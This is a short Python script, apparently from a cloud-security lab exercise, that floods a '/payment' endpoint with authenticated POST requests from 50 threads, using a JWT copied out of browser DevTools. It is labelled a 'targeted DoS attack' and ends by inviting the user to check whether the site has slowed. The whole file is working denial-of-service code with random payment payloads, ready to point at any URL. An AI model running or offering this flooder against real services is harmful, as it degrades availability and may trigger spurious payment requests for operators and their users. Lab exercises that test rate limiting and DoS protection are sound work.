import threading
import requests
import time
import random

# --- CONFIGURATION ---
# 1. Replace this with your actual URL from the AWS Console
BASE_URL = "PASTE_YOUR_URL"
TARGET_URL = f"{BASE_URL}/payment"

# 2. YOUR TASK: 
# Log into the website, open DevTools -> Network tab. 
# Look for a request to 'total' or 'order', find the 'Authorization' header.
# Copy the long string starting after 'Bearer ' and paste it below between the quotes.
MY_JWT_TOKEN = "PASTE_YOUR_TOKEN_HERE"

# Settings
THREADS = 50  
REPETITIONS = 10

def send_request(thread_id):
    """Sends multiple POST requests to the payment endpoint with Auth."""
    header_data = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {MY_JWT_TOKEN}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    for i in range(REPETITIONS):
        try:
            payload = {
                "item": "product_" + str(random.randint(1, 1000)),
                "amount": random.randint(1, 500),
                "nonce": random.random()
            }
            
            response = requests.post(
                TARGET_URL, 
                json=payload, 
                headers=header_data,
                timeout=10
            )
            
            # Status 200 = Success (HITTING the Lambda)
            # Status 403 = Forbidden (Token is wrong or AWS is blocking you)
            # Status 429 = Too Many Requests (You triggered the DoS protection!)
            print(f"[Thread {thread_id} - Req {i}] Status: {response.status_code}")
            
        except Exception as e:
            print(f"[Thread {thread_id} - Req {i}] Error: {e}")
        
        time.sleep(0.05)

def run_attack():
    # This check is just to prevent you from running the script with the default text.
    # Once you replace "PASTE_YOUR_TOKEN_HERE" with your actual token, 
    # this 'if' will be False, and the attack will start.
    if MY_JWT_TOKEN == "PASTE_YOUR_TOKEN_HERE":
        print("---------------------------------------------------------")
        print("ERROR: Missing Token!")
        print("Please replace 'PASTE_YOUR_TOKEN_HERE' at the top of the")
        print("script with your actual JWT from the browser.")
        print("---------------------------------------------------------")
        return

    print(f"Starting targeted DoS attack on {TARGET_URL}...")
    threads = []
    
    for i in range(THREADS):
        t = threading.Thread(target=send_request, args=(i,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\nAttack cycle complete. Try checking the website now to see if it's slow!")

if __name__ == "__main__":
    run_attack()